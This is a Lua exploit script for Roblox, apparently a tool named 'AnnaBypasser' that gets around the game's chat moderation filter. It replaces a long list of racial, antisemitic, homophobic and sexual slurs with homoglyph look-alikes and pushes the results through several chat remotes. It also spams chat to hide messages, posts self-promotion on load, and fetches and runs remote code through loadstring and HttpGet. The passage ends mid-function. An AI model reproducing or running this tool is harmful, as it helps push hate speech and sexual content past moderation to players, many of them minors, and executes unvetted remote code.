if game:GetService("CoreGui"):FindFirstChild("AnnaBypasser") then
    print("AnnaBypasser already loaded")
    game:GetService("CoreGui"):FindFirstChild("AnnaBypasser"):Destroy()
end
if _G.NiggerSex ~= "fagnigger6" then
    pcall(function()
        Game.Players:chat("AnnaBypasser Loaded")
        Game.Players:chat("EEEEEEEEEEEEE")
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("AnnaBypasser\8Loaded\8Made\8By\8Anna\8- guilded.gg/u/AnnaBlox\8rebrand.ly/AnnaBypasser -\8updates:\8https://dis\217\144cord.gg/VrSHuQQBPh", "All")
    end)
end
print("AnnaBypasser Loaded")
print("updated 8/20/2025")
print("press right ctrl to toggle gui")
print("press ether slash key to focus on gui")
print("filter check pre filters your message to block filtered msgs from chat")
local vu1 = Instance.new("ScreenGui")
vu1.Name = "AnnaBypasser"
local vu2 = Instance.new("Frame")
local v3 = Instance.new("ImageLabel")
local vu4 = Instance.new("TextBox")
local v5 = Instance.new("TextButton")
local vu6 = Instance.new("TextBox")
local vu7 = Instance.new("TextButton")
local _ = game:GetService("Players").LocalPlayer
vu1.Parent = game.CoreGui
vu2.Parent = vu1
vu2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
vu2.Position = UDim2.new(0.7, 35, 0.7, - 100)
vu2.Size = UDim2.new(0, 300, 0, 200)
v3.Size = UDim2.new(1, 0, 0.4, 0)
v3.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
v3.Position = UDim2.new(0, 0, - 0.3, 0)
v3.Image = "rbxassetid://84482790380175"
v3.Parent = vu2
local v8 = game:GetService("UserInputService")
local vu9 = nil
local vu10 = nil
local vu11 = nil
local function vu14(p12)
    local v13 = p12.Position - vu10
    vu2.Position = UDim2.new(vu11.X.Scale, vu11.X.Offset + v13.X, vu11.Y.Scale, vu11.Y.Offset + v13.Y)
end
vu2.InputBegan:Connect(function(pu15)
    if pu15.UserInputType == Enum.UserInputType.MouseButton1 or pu15.UserInputType == Enum.UserInputType.Touch then
        vu9 = true
        vu10 = pu15.Position
        vu11 = vu2.Position
        pu15.Changed:Connect(function()
            if pu15.UserInputState == Enum.UserInputState.End then
                vu9 = false
            end
        end)
    end
end)
vu2.InputChanged:Connect(function(p16)
    if (p16.UserInputType == Enum.UserInputType.MouseMovement or p16.UserInputType == Enum.UserInputType.Touch) and vu9 then
        vu14(p16)
    end
end)
v3.InputBegan:Connect(function(pu17)
    if pu17.UserInputType == Enum.UserInputType.MouseButton1 or pu17.UserInputType == Enum.UserInputType.Touch then
        vu9 = true
        vu10 = pu17.Position
        vu11 = vu2.Position
        pu17.Changed:Connect(function()
            if pu17.UserInputState == Enum.UserInputState.End then
                vu9 = false
            end
        end)
    end
end)
v3.InputChanged:Connect(function(p18)
    if (p18.UserInputType == Enum.UserInputType.MouseMovement or p18.UserInputType == Enum.UserInputType.Touch) and vu9 then
        vu14(p18)
    end
end)
vu4.Parent = vu2
vu4.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
vu4.Position = UDim2.new(0.05, 0, 0.05, 0)
vu4.Size = UDim2.new(0.9, 0, 0.3, 0)
vu4.Font = Enum.Font.SourceSans
vu4.PlaceholderText = "Enter text here"
vu4.Text = ""
vu4.TextColor3 = Color3.fromRGB(0, 255, 0)
vu4.TextSize = 14
vu4.ClearTextOnFocus = true
v5.Parent = vu2
v5.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
v5.Position = UDim2.new(0.25, 0, 0.4, 0)
v5.Size = UDim2.new(0.5, 0, 0.15, 0)
v5.Font = Enum.Font.SourceSans
v5.Text = "Bypass Text"
v5.TextColor3 = Color3.fromRGB(255, 255, 255)
v5.TextSize = 14
vu6.Parent = vu2
vu6.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
vu6.Position = UDim2.new(0.05, 0, 0.6, 0)
vu6.Size = UDim2.new(0.9, 0, 0.35, 0)
vu6.Font = Enum.Font.SourceSans
vu6.Text = "Bypassed text will appear here"
vu6.TextColor3 = Color3.fromRGB(0, 255, 0)
vu6.TextSize = 14
vu6.TextWrapped = true
local v19 = Instance.new("TextLabel")
v19.Parent = vu2
v19.BackgroundTransparency = 1
v19.Position = UDim2.new(0.05, 0, 0.36, 0)
v19.Size = UDim2.new(0.15, 0, 0.05, 0)
v19.Font = Enum.Font.SourceSans
v19.Text = "Filter Check"
v19.TextColor3 = Color3.fromRGB(255, 255, 255)
v19.TextSize = 14
local vu20 = Instance.new("Frame")
vu20.Parent = vu2
vu20.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
vu20.Position = UDim2.new(0.05, 0, 0.43, 0)
vu20.Size = UDim2.new(0.15, 0, 0.15, 0)
local vu21 = Instance.new("TextLabel")
vu21.Parent = vu20
vu21.BackgroundTransparency = 1
vu21.Size = UDim2.new(1, 0, 1, 0)
vu21.Font = Enum.Font.SourceSansBold
vu21.Text = "X"
vu21.TextColor3 = Color3.fromRGB(0, 255, 0)
vu21.TextSize = 24
local vu22 = false
vu20.InputBegan:Connect(function(p23)
    if p23.UserInputType == Enum.UserInputType.MouseButton1 then
        vu22 = not vu22
        vu21.Text = vu22 and "" or "X"
        vu20.BackgroundColor3 = vu22 and Color3.fromRGB(60, 60, 60) or Color3.fromRGB(40, 40, 40)
    end
end)
local vu24 = false
vu7.MouseButton1Click:Connect(function()
    vu24 = not vu24
    vu7.BackgroundColor3 = vu24 and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(100, 0, 0)
end)
local function vu28()
    local v25 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    local v26 = ""
    for _ = 1, math.random(80, 90) do
        local v27 = math.random(1, # v25)
        v26 = v26 .. string.sub(v25, v27, v27)
    end
    return v26
end
local function vu31(pu29)
    if vu24 or vu22 then
        for _ = 1, 8 do
            local vu30 = vu28()
            pcall(function()
                Game.Players:Chat((pu29 .. " " or "(eee) ") .. vu30)
            end)
        end
    end
end
local vu32 = {
america = "america",
AMERICA = "AMERICA",
America = "America",
anal = "\208\176n\208\176\211\143",
ANAL = "\208\144\206\157\208\144L",
Anna = "Anna",
anti = "anti",
ANTI = "ANTI",
ASS = "ASS",
ass = "a\224\184\152\224\184\152",
asses = "a\224\184\152\224\184\152es",
ASSES = "ASSES",
asshole = "a\224\184\152\224\184\152ho\211\143e",
assholes = "a\224\184\152\224\184\152ho\211\143e\209\149",
ASSHOLE = "A\217\144\208\133\208\133\208\157\208\158L\208\149",
ASSHOLES = "A\217\144\208\133\208\133\208\157\208\158L\208\149S",
al = "al",
bastard = "\225\131\174astard",
BASTARD = "BA\225\131\189TARD",
Bastard = "\225\131\174astard",
bdsm = "bd\224\184\152m",
BDSM = "BD\225\131\189M",
beaner = "bea\226\180\150er",
BEANER = "BEANER",
bisexual = "bi\224\184\152exual",
BISEXUAL = "BI\225\131\189EXUAL",
black = "b\211\143ack",
bitch = "\225\131\174itch",
bitches = "\225\131\174itches",
BITCHES = "BITCHES",
BITCH = "\225\131\174ITCH",
blox = "blox",
blowjob = "b\211\143owjo\225\131\174",
blowjobs = "b\211\143owjo\225\131\174s",
BLOWJOB = "\208\146\227\128\170LOWJ\208\158\208\146",
bondage = "bo\226\180\150dage",
BONDAGE = "\225\131\174ONDAGE",
boob = "\225\131\174\208\190\208\190\225\131\174",
boobies = "\225\131\174\208\190\208\190\225\131\174ies",
boobs = "\225\131\174\208\190\208\190\225\131\174s",
BOOBS = "B\208\158\208\158\208\146\208\133",
BOOB = "B\208\158\208\158\208\146",
booty = "\225\131\174ooty",
BOOTY = "B\208\158\208\158TY",
bong = "bo\226\180\150g",
BONG = "BONG",
boner = "bo\226\180\150er",
Boner = "Bo\226\180\150er",
BONER = "BONER",
breast = "brea\224\184\152t",
breasts = "brea\224\184\152t\224\184\152",
breed = "breed",
bypass = "bypass",
brazz = "bra\226\180\173\226\180\173",
BRAZZ = "BRA\225\131\141\225\131\141",
call = "call",
chong = "cho\226\180\150g",
coochie = "cooch\196\177\219\172e",
Coochie = "Cooch\196\177\219\172e",
cocaine = "coca\196\177\219\172ne",
childfucker = "childf\224\184\169cker",
CHILDFUCKER = "CHILD\234\156\176UCKER",
chink = "chink",
CHINK = "CHINK",
clit = "c\211\143it",
CLIT = "CLlT",
commie = "commie",
commies = "commies",
COMMIE = "COMMIE",
COMMIES = "COMMIES",
cock = "c\219\172\219\172\219\172\219\172\219\172\219\172oc\219\172\219\172\219\172\219\172\219\172\219\172k",
COCK = "\225\178\131\208\158\208\161K",
Cock = "\225\178\131\208\190\209\129k",
cocksuck = "c\219\172\219\172\219\172\219\172\219\172\219\172oc\219\172\219\172\219\172\219\172\219\172\219\172ks\217\144uck",
COCKSUCK = "\225\178\131\208\158\208\161K\225\130\189UCK",
cocksucker = "c\215\130\215\130\215\130\215\130ocks\217\144ucker",
COCKSUCKER = "\225\178\131\208\158\208\161KS\217\144U\208\161K\208\149R",
condom = "co\226\180\150dom",
consent = "con\224\184\152ent",
consented = "con\224\184\152ented",
CONDOM = "\225\178\131ONDOM",
CONSENT = "\225\178\131ONSENT",
CONSENTED = "\225\178\131ONSENTED",
coon = "coon",
crack = "crack",
creampie = "creamp\196\177\219\172e",
Creampie = "\225\178\131reampie",
CREAMPIE = "\225\178\131REAMPIE",
cuck = "c\224\184\169ck",
Cuck = "C\224\184\169ck",
CUCK = "\225\178\131U\225\178\131K",
cum = "c\224\184\169m",
CUM = "\225\178\131UM",
cumming = "c\224\184\169mming",
CUMMING = "\225\178\131UMMING",
cumslut = "c\224\184\169ms\211\143ut",
CUMSLUT = "\225\178\131UM\225\131\189LUT",
cunt = "cu\226\180\150t",
cunnie = "cu\226\180\150\226\180\150ie",
CUNNIE = "\225\178\131UNNIE",
cunts = "cu\226\180\150ts",
CUNT = "\225\178\131UNT",
chair = "chair",
ching = "ching",
deepthroat = "deepthro\224\184\170t",
DEEPTHROAT = "\195\144EEPTHROAT",
deadass = "d\217\144eadass",
dirty = "dirty",
DIRTY = "DIRTY",
dildo = "di\211\143do",
DILDO = "\195\144ILDO",
DICK = "\195\144I\225\178\131K",
dick = "d\215\130\215\130\215\130ick",
dogfucker = "dogf\224\184\169cker",
DOGFUCKER = "DOG\234\156\176UCKER",
drug = "drug",
drunk = "dr\224\184\169nk",
discord = "di\224\184\152cord",
DISCORD = "\195\144ISCORD",
drugs = "dr\224\184\169g\224\184\152",
DRUG = "DRUG",
DRUGS = "\195\144RUGS",
dumbass = "d\224\184\169mba\224\184\152\224\184\152",
DUMBASS = "\195\144UMBASS",
email = "emai\211\143",
erection = "erectio\226\180\150",
Erection = "Erectio\226\180\150",
fagg = "f\224\184\170gg",
fag = "f\224\184\170g",
Fagg = "\234\156\176\224\184\170ggot",
faggot = "f\224\184\170\225\184\161\225\184\161ot",
Faggot = "\234\156\176aggot",
FAGGOT = "\234\156\176AGGOT",
faggots = "f\217\144aggots",
FAGGOTS = "\234\156\176AGGOTS",
fags = "f\224\184\170gs",
fatass = "f\217\144atass",
Fat = "\234\156\176at",
FAT = "\234\156\176AT",
Fatass = "F\217\144ata\224\184\152\224\184\152",
fatasses = "fata\224\184\152\224\184\152es",
FATASS = "\234\156\176ATASS",
fi = "fi",
FI = "FI",
fl = "fl",
FUCK = "\234\156\176UCK",
fuck = "f\224\184\169ck",
Fuck = "\234\156\176uck",
fucking = "f\224\184\169\209\129k\209\150ng",
FUCKING = "\234\156\176UCKING",
fuckable = "f\224\184\169ckable",
FUCKABLE = "\234\156\176UCKABLE",
fuckboy = "f\224\184\169ckboy",
Fuckboy = "\234\156\176uckboy",
FUCKBOY = "\234\156\176UCKBOY",
fucked = "f\224\184\169cked",
fucker = "f\224\184\169cker",
fucks = "f\224\184\169cks",
Fucked = "\234\156\176ucked",
Fucker = "\234\156\176ucker",
Fucks = "\234\156\176ucks",
FUCKED = "\234\156\176UCKED",
FUCKER = "\234\156\176UCKER",
FUCKS = "\234\156\176UCKS",
fucktard = "f\224\184\169cktard",
Fucktard = "\234\156\176ucktard",
FUCKTARD = "\234\156\176UCKTARD",
fucktoy = "f\224\184\169cktoy",
FUCKTOY = "\234\156\176UCKTOY",
Fucktoy = "\234\156\176ucktoy",
give = "give",
girl = "gir\211\143",
Girl = "Gir\211\143",
GIRL = "GIRL",
grop = "g\234\158\133op",
GROP = "G\215\133ROP",
Grop = "G\234\158\133op",
gender = "ge\226\180\150der",
Gender = "Ge\226\180\150der",
genocide = "ge\226\180\150ocide",
Genocide = "Ge\226\180\150ocide",
google = "goog\211\143e",
Google = "Goog\211\143e",
have = "have",
handjob = "ha\226\180\150djob",
heil = "hei\211\143",
hentai = "he\226\180\150ta\196\177\219\172",
Hentai = "He\226\180\150ta\196\177\219\172",
HENTAI = "H\217\144ENTAl",
Heil = "he\196\177\219\172\211\143",
HEIL = "HEIL",
hitler = "\210\187\196\177\219\172t\211\143\208\181\208\179",
Hitler = "H\196\177\219\172t\211\143\208\181\208\179",
HEIL = "H\217\144EIL",
HITLER = "H\217\144ITLER",
holocaust = "holocau\224\184\152t",
HOE = "HOE",
hoe = "hoe",
holy = "holy",
homosexual = "homo\224\184\152exual",
Homosexual = "Homo\224\184\152exual",
hooker = "hooke\234\158\133",
horny = "hor\226\180\150y",
Hooker = "Hooke\234\158\133",
Horny = "Hor\226\180\150y",
HOMOSEXUAL = "HOMO\224\184\152exUAL",
HOOKER = "H\217\144OOKER",
HORNY = "H\217\144ORNY",
instagram = "in\224\184\152tagram",
INSTAGRAM = "I\217\144NSTAGRAM",
isis = "i\217\144s\217\144i\217\144s\217\144",
im = "im",
ip = "ip",
IP = "IP",
id = "id",
il = "il",
is = "is",
le = "le",
ig = "ig",
iv = "iv",
ie = "ie",
ll = "ll",
ir = "ir",
ii = "ii",
ly = "ly",
lo = "lo",
im = "im",
IM = "IM",
ld = "ld",
ft = "ft",
ic = "ic",
ix = "ix",
INE = "INE",
ING = "ING",
jesus = "jesus",
Jesus = "Jesus",
jackass = "jacka\224\184\152\224\184\152",
JACKASS = "J\217\144ACKASS",
jungle = "jung\211\143e",
jew = "jew",
jews = "jews",
jerking = "j\217\144erking",
JERKMATE = "J\217\144ERKMATE",
job = "j\217\144ob",
jig = "j\196\177\219\172g",
jigaboo = "j\217\144igaboo",
jiggaboo = "j\217\144iggaboo",
Jig = "J\217\144ig",
kkk = "kkk",
KKK = "KKK",
kys = "kys",
kill = "k\196\177\219\172ll",
Kill = "\225\180\139\196\177\219\172ll",
KILL = "K\217\144ILL",
killing = "k\196\177\219\172lling",
killed = "ki\211\143\211\143ed",
KILLING = "KILLING",
KILLED = "K\217\144ILLED",
knife = "knife",
KNIFE = "KNIFE",
kiss = "kiss",
kissing = "k\196\177\219\172ssing",
KISS = "KISS",
KISSING = "KISSING",
kinky = "ki\226\180\150ky",
kike = "k\196\177\219\172ke",
KINKY = "Ki\226\180\150ky",
lap = "\211\143ap",
LMAO = "LMAO",
lmao = "\211\143mao",
love = "\211\143ove",
like = "like",
LIKE = "LIKE",
luck = "luck",
lust = "\211\143ust",
LUST = "L\217\144UST",
Lust = "L\224\184\169st",
liberal = "liberal",
LIBERAL = "LIBERAL",
Liberal = "Liberal",
lsd = "\211\143sd",
LSD = "L\217\144SD",
lgbtq = "\211\143gbtq",
masturbate = "ma\224\184\152turbate",
Masturbate = "Ma\224\184\152turbate",
mexican = "mexican",
MEXICAN = "MEXICAN",
myass = "my\8a\224\184\152\224\184\152",
MYASS = "MY\8A\217\144SS",
mississippi = "mississippi",
MISSISSIPPI = "MISSISSIPPI",
milf = "mi\211\143f",
Milf = "Mi\211\143f",
molest = "mole\224\184\152t",
Molest = "Mole\224\184\152t",
MOLEST = "MOLE\225\131\189T",
motherfucker = "motherf\224\184\169cker",
Motherfucker = "Motherf\224\184\169cker",
motherfucking = "motherf\224\184\169cking",
MOTHERFUCKER = "MOTHER\234\156\176UCKER",
MOTHERFUCKING = "MOTHER\234\156\176UCKING",
naked = "\226\180\150aked",
Naked = "N\217\144aked",
nazi = "na\226\180\173i",
NAZI = "NA\225\131\141I",
negro = "\226\180\150egro",
Negro = "N\217\144egro",
negrophobia = "\226\180\150egrophobia",
negroes = "\226\180\150egroes",
NAKED = "N\217\144AKED",
NEGRO = "N\217\144EGRO",
NEGROES = "N\217\144EGROES",
nice = "nice",
NICE = "NICE",
NIGGA = "NlGGA",
Nigga = "N\217\144igga",
nig = "\226\180\150\225\191\152g",
niger = "\226\180\150\225\191\152ger",
nigeria = "\226\180\150\225\191\152geria",
niglet = "\226\180\150iglet",
niglets = "\226\180\150iglet\209\149",
nigg = "\226\180\150\225\191\152gg",
Nigg = "N\217\144igg",
NIGG = "N\217\144IGG",
nigga = "\226\180\150igg\224\184\170",
niggas = "\226\180\150igg\224\184\170\224\184\152",
niggers = "\226\180\150\225\191\152gge\234\158\133\224\184\152",
nigger = "\226\180\150\225\191\152gge\234\158\133",
NIGGER = "N\217\144IGGER",
NIGGERS = "N\217\144\217\144IGGERS",
NiggerSex = "N\217\144igger\225\131\189ex",
nsfw = "\226\180\150sfw",
Nsfw = "N\217\144sfw",
nude = "\226\180\150ude",
Nude = "N\217\144ude",
nudes = "\226\180\150udes",
Nudes = "N\217\144udes",
NSFW = "N\217\144SFW",
NUDE = "N\217\144UDE",
NUDES = "\206\157\217\144UDES",
orgy = "o\234\158\133gy",
ORGY = "O\217\144RGY",
panties = "pa\226\180\150ties",
Panties = "Pa\226\180\150ties",
penis = "peni\224\184\152",
PENIS = "PENI\225\131\189",
PORNHUB = "P\217\144ORNHUB",
PORN = "P\217\144ORN",
Porn = "Por\226\180\150",
power = "p\217\144ower",
POWER = "P\217\144OWER",
pussy = "pu\224\184\152\224\184\152y",
Pussy = "Pu\224\184\152\224\184\152y",
PUSSY = "PU\225\131\189\225\131\189Y",
prostitute = "pro\224\184\152titute",
PROSTITUTE = "P\217\144\217\144ROSTITUTE",
pick = "pick",
phile = "ph\196\177\219\172\211\143e",
pedophile = "pedoph\196\177\219\172\211\143e",
racist = "racist",
rape = "r\224\184\170\209\128\208\181",
Rape = "R\224\184\170\209\128\208\181",
RAPE = "R\208\144\208\160\208\149",
raped = "r\224\184\170p\208\181d",
Raped = "r\224\184\170p\208\181d",
RAPED = "R\208\144P\208\149D",
raping = "rapi\226\180\150g",
rapist = "rapi\224\184\152t",
rapists = "rapi\224\184\152t\209\149",
RAPIST = "R\208\144P\211\128\208\133\208\162",
Raping = "Rapi\226\180\150g",
Rapist = "Rapi\224\184\152t",
raghead = "r\224\184\170ghead",
Raghead = "R\217\144aghead",
RAGHEAD = "R\217\144AGHEAD",
redskin = "redski\226\180\150",
Redskin = "Redski\226\180\150",
retard = "r\208\181t\224\184\170rd",
RETARD = "R\217\144\217\144ETARD",
roblox = "roblox",
republican = "republican",
Republican = "Republican",
says = "s\217\144ays",
Says = "S\217\144ays",
SAYS = "S\217\144AYS",
script = "script",
semen = "seme\226\180\150",
Semen = "Seme\226\180\150",
SEMEN = "\225\131\189EMEN",
seduc = "s\217\144educ",
Seduced = "\225\131\189educ",
SEDUC = "SEDUC",
sex = "\224\184\152ex",
Sex = "\225\131\189ex",
SEX = "\225\131\189EX",
sexist = "\224\184\152exist",
sext = "\224\184\152ext",
sextoy = "\224\184\152extoy",
sexual = "\224\184\152exual",
sexy = "\224\184\152exy",
sexdoll = "\224\184\152exdoll",
Sexdoll = "\224\184\152exdoll",
shit = "\224\184\152hit",
Shit = "\225\131\189hit",
SHIT = "\225\131\189\208\157\211\128\208\162",
should = "should",
shot = "s\217\144hot",
Shot = "\225\131\189hot",
spic = "s\217\144pic",
Spic = "sp\196\177\219\172c",
SPIC = "\225\131\189PIC",
SIEG = "SIEG",
SLAVE = "\225\131\189LAVE",
slave = "\224\184\152\211\143ave",
SLAVERY = "\225\131\189LAVERY",
SLAVES = "\225\131\189LAVES",
Slave = "S\211\143ave",
slur = "\209\149lur",
slut = "\209\149\211\143ut",
SLUT = "\225\131\189LUT",
Slut = "\208\133\211\143ut",
strip = "\224\184\152trip",
STRIP = "\225\131\189TRIP",
sucker = "s\224\184\169cker",
Sucker = "S\224\184\169cker",
SUCKER = "\225\131\189UCKER",
SUCKING = "SUCKING",
snapchat = "s\226\180\150apchat",
Snapchat = "S\226\180\150apchat",
sperm = "\224\184\152perm",
Sperm = "\225\131\189perm",
sperms = "\224\184\152perms",
SNAPCHAT = "\225\131\189NAPCHAT",
SPERM = "\225\131\189PERM",
stupid = "\224\184\152tupid",
suicide = "\224\184\152uicide",
TARD = "T\217\144ARD",
terrorist = "terrori\224\184\152t",
terrorism = "terrori\224\184\152m",
this = "thi\224\184\152",
THIS = "THI\225\131\189",
threesome = "three\224\184\152ome",
Threesome = "Three\224\184\152ome",
THREESOME = "THREE\225\131\189OME",
thong = "tho\226\180\150g",
tits = "t\196\177\219\172t\224\184\152",
titt = "t\196\177\219\172tt",
titties = "t\196\177\219\172tties",
TITTIES = "T\217\144ITTIES",
Titt = "T\196\177\219\172tt",
Tits = "T\196\177\219\172t\224\184\152",
tiktok = "tiktok",
TONIGHT = "TONIGHT",
tranny = "tr\224\184\170nny",
trannie = "trann\196\177\219\172e",
TRANNY = "T\217\144RANNY",
TRANNIE = "TRANNlE",
TRUMP = "TRUM\208\160",
trump = "trum\209\128",
twat = "tw\224\184\170t",
Twat = "T\217\144wat",
TWAT = "\217\144T\217\144WAT",
twink = "twi\226\180\150k",
twinks = "twinks",
vagina = "vagi\226\180\150a",
Vagina = "Vagi\226\180\150a",
weed = "w\217\144eed",
Weed = "W\217\144eed",
WEED = "W\217\144EED",
well = "well",
wetback = "w\217\144etb\224\184\170ck",
Wetback = "W\217\144etback",
WETBACK = "W\217\144ETBACK",
whore = "\224\184\158\224\184\186hore",
Whore = "W\217\144hore",
whores = "w\217\144hores",
Whores = "W\217\144hores",
WHORE = "W\217\144HORE",
white = "w\210\187\209\150t\208\181",
White = "W\210\187\209\150t\208\181",
xxx = "\211\189\211\189\211\189",
XXX = "X\217\144X\217\144X\217\144",
youtube = "yout\224\184\169be",
YOUTUBE = "Y\217\144OUTUBE",
Youtube = "Yout\224\184\169be",
your = "yo\224\184\169r",
Your = "Yo\224\184\169r",
zoophile = "zooph\196\177\219\172Ie"}
local function vu34(p33)
    return p33:gsub("i", "\196\177\219\172")
end
local function vu36(p35)
    return p35:gsub("xxx", "\211\189\211\189\211\189")
end
local function vu38(p37)
    return p37:gsub("l", "\211\143")
end
local function vu40(p39)
    return p39:gsub("I", "I")
end
local function vu42(p41)
    return p41:gsub("rape", "r\224\184\170\209\128\208\181")
end
local function vu44(p43)
    return p43:gsub("RAPE", "R\208\144\208\160\208\149")
end
local function vu46(p45)
    return p45:gsub("porn", "por\226\180\150")
end
local function vu48(p47)
    return p47:gsub("sex", "\224\184\152ex")
end
local function vu50(p49)
    return p49:gsub("cums", "c\224\184\169ms")
end
local function vu52(p51)
    return p51:gsub("cum", "c\224\184\169m")
end
local function vu54(p53)
    return p53:gsub("faggot", "f\224\184\170ggot")
end
local function vu56(p55)
    return p55:gsub("cock", "c\217\144\208\190\209\129k")
end
local function vu58(p57)
    return p57:gsub("fuck", "f\224\184\169ck")
end
local function vu60(p59)
    return p59:gsub("tard", "t\217\144ard")
end
local function vu62(p61)
    return p61:gsub("in", "in")
end
local function vu64(p63)
    return p63:gsub("ing", "ing")
end
local function vu66(p65)
    return p65:gsub("ith", "ith")
end
local function vu68(p67)
    return p67:gsub("it", "it")
end
local vu69 = {
    g = "g",
    i = "\196\177\219\172",
    j = "j\217\144",
    l = "l",
    y = "y",
    I = "l"
}
local function vu83(p70)
    local v71 = p70:gsub("[%p%c%s]", "")
    local v72, v73, v74 = p70:gmatch("[%p%c%s]")
    local v75 = {}
    while true do
        v74 = v72(v73, v74)
        if v74 == nil then
            break
        end
        table.insert(v75, v74)
    end
    if vu32[v71] then
        local v76 = p70:match("^([%p%c%s]*)")
        local v77 = p70:match("([%p%c%s]*)$")
        return v76 .. vu32[v71] .. v77
    end
    local v78, v79, v80 = pairs(vu32)
    while true do
        v80 = v78(v79, v80)
        if v80 == nil then
            break
        end
        if v71:find(v80) then
            return p70:gsub(v80, vu32[v80])
        end
    end
    if # v71 < 4 then
        return p70
    end
    if p70:find("rape") then
        return vu42(p70)
    end
    if p70:find("RAPE") then
        return vu44(p70)
    end
    if p70:find("ith") then
        return vu66(p70)
    end
    if p70:find("ing") then
        return vu64(p70)
    end
    if p70:find("tard") then
        return vu60(p70)
    end
    if p70:find("it") then
        return vu68(p70)
    end
    if p70:find("in") then
        return vu62(p70)
    end
    if p70:find("i") then
        return vu34(p70)
    end
    if p70:find("xxx") then
        return vu36(p70)
    end
    if p70:find("l") then
        return vu38(p70)
    end
    if p70:find("I") then
        return vu40(p70)
    end
    if p70:find("porn") then
        return vu46(p70)
    end
    if p70:find("sex") then
        return vu48(p70)
    end
    if p70:find("cums") then
        return vu50(p70)
    end
    if p70:find("cum") then
        return vu52(p70)
    end
    if p70:find("faggot") then
        return vu54(p70)
    end
    if p70:find("cock") then
        return vu56(p70)
    end
    if p70:find("fuck") then
        return vu58(p70)
    end
    local v81 = p70:sub(1, 1)
    local v82 = p70:sub(2)
    return (vu69[v81] or v81) .. v82
end
local function vu94()
    local v84, v85, v86 = vu4.Text:gmatch("%S+")
    local v87 = {}
    local v88 = ""
    local v89 = 0
    while true do
        v86 = v84(v85, v86)
        if v86 == nil then
            break
        end
        table.insert(v87, v86)
    end
    local v90, v91, v92 = ipairs(v87)
    while true do
        local v93
        v92, v93 = v90(v91, v92)
        if v92 == nil then
            break
        end
        v88 = v88 .. vu83(v93)
        v89 = v89 + 1
        if v92 < # v87 then
            if v89 % 7 ~= 0 or v92 >= # v87 - 1 then
                v88 = v88 .. "\8"
            else
                v88 = v88 .. " "
            end
        end
    end
    vu6.Text = v88
    return v88
end
local vu95 = game:GetService("Players")
local vu96 = vu95.LocalPlayer
local function vu99(p97)
    local v98 = game:GetService("Chat"):FilterStringAsync(p97, vu96, vu96)
    return v98 == p97, v98
end
local function vu104(p100)
    if p100:sub(1, 2) == "/e" or p100:sub(1, 2) == "\\e" then
        if p100:sub(1, 2) == "\\e" then
            p100 = "/e" .. p100:sub(3)
        end
        game.Players:Chat(p100)
        return
    else
        local vu101 = vu94(p100)
        local v102, v103, _ = pcall(function()
            return vu99(vu101)
        end)
        if v102 then
            if vu22 then
                if v103 then
                    if not previewMode then
                        pcall(function()
                            vu31("AntiTags - AnnaBypasser")
                            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(vu101, "All")
                            task.wait(1)
                            vu31("AntiTags - AnnaBypasser")
                        end)
                    end
                    pcall(function()
                        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(vu101)
                    end)
                    vu6.Text = vu101
                    vu6.TextColor3 = Color3.fromRGB(0, 255, 0)
                else
                    vu6.Text = "Text Filtered: resetting filter"
                    vu6.TextColor3 = Color3.fromRGB(255, 0, 0)
                    vu31("AntiTags - AnnaBypasser")
                end
            else
                if not previewMode then
                    pcall(function()
                        vu31()
                        workspace.Main.Chatted:FireServer(vu101)
                    end)
                    vu31()
                end
                pcall(function()
                    vu31("Anti Tags - AnnaBypasser")
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(vu101, "All")
                    task.wait(1)
                    vu31("Anti Tags - AnnaBypasser")
                end)
                pcall(function()
                    game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(vu101)
                end)
                vu6.Text = vu101
                vu6.TextColor3 = Color3.fromRGB(0, 255, 0)
            end
        else
            vu6.Text = "Error filtering message"
            vu6.TextColor3 = Color3.fromRGB(255, 0, 0)
        end
    end
end
vu4.FocusLost:Connect(function(p105)
    if p105 then
        vu104(vu4.Text)
    end
end)
v5.MouseButton1Click:Connect(function()
    vu104(vu4.Text)
end)
local function vu106()
    vu1.Enabled = not vu1.Enabled
end
v8.InputBegan:Connect(function(p107, p108)
    if not p108 and p107.KeyCode == Enum.KeyCode.RightControl then
        vu106()
    end
end)
v8.InputBegan:Connect(function(p109, p110)
    if not p110 and (p109.KeyCode == Enum.KeyCode.Slash or p109.KeyCode == Enum.KeyCode.BackSlash) then
        wait(0)
        vu4.Text = ""
        vu4:CaptureFocus()
    end
end)
local vu111 = {}
local function vu115(p112)
    local v113 = Instance.new("ScreenGui")
    local v114 = Instance.new("TextLabel")
    v113.Parent = vu96:WaitForChild("PlayerGui")
    v114.Size = UDim2.new(0.5, 0, 0.1, 0)
    v114.Position = UDim2.new(0.25, 0, 0.45, 0)
    v114.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    v114.TextColor3 = Color3.fromRGB(0, 0, 0)
    v114.Text = p112
    v114.Parent = v113
    wait(7)
    v113:Destroy()
end
local function v118(p116)
    if not vu111[p116] then
        local vu117 = vu95:FindFirstChild(p116)
        if vu117 then
            vu111[p116] = true
            vu115("script creator is in game!" .. " - " .. vu117.Name)
            pcall(function()
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("script creator is in game!" .. " - " .. vu117.Name, "All")
            end)
            pcall(function()
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("script creator is in game!" .. " - " .. vu117.Name)
            end)
        end
    end
end
local function v120()
    local v119 = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
    if v119 then
        if not v119:FindFirstChild("SayMessageRequest") then
            vu115("SayMessageRequest is missing! Please note that antilogger might not work properly.")
        end
    else
        vu115("textchatservice detected antilogger wont work here use at your own risk")
    end
end
v120()
v120()
loadstring(game:HttpGet("https://raw.githubusercontent.com/joshclark756/joshclark756-s-scripts/refs/heads/main/reset%20filter.lua", true))()
local function vu124(pu121)
